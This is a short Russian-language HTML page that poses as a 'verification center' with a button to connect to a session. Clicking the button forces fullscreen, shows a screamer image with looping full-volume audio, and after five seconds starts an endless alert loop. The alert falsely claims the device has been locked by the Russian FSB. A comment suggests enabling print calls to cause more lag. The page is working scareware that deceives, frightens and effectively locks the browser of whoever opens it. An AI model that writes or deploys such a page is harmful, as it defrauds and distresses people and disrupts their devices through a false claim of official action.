<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Центр верификации</title>
    <style>
        body { margin: 0; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
        #s { display: none; width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; z-index: 999; }
        .btn { padding: 25px 50px; background: #0056b3; color: #fff; border: none; font-size: 1.8rem; cursor: pointer; border-radius: 5px; font-family: sans-serif; font-weight: bold; z-index: 1000; transition: 0.3s; }
        .btn:hover { background: #004494; transform: scale(1.05); }
    </style>
</head>
<body>
    <button class="btn" onclick="go()">ПОДКЛЮЧИТЬСЯ К СЕССИИ</button>
    <img id="s" src="face.jpg">
    <audio id="a" src="s.mp3" loop></audio>

    <script>
        function go() {
            let a = document.getElementById('a');
            let i = document.getElementById('s');
            
            // Запрашиваем полный экран
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }

            // Убираем кнопку, показываем скример
            document.querySelector('.btn').style.display = 'none';
            i.style.display = 'block';
            
            // Включаем звук на полную
            a.volume = 1.0;
            a.play();

            // ЗАДЕРЖКА 5 СЕКУНД (5000 мс)
            setTimeout(() => {
                while(true) {
                    alert("КРИТИЧЕСКАЯ ОШИБКА: НЕСАНКЦИОНИРОВАННЫЙ ДОСТУП. УСТРОЙСТВО ЗАБЛОКИРОВАНО ФСБ РФ.");
                    // window.print(); // Опционально: можно раскомментировать для еще больших лагов
                }
            }, 5000); 
        }
    </script>
</body>
</html>
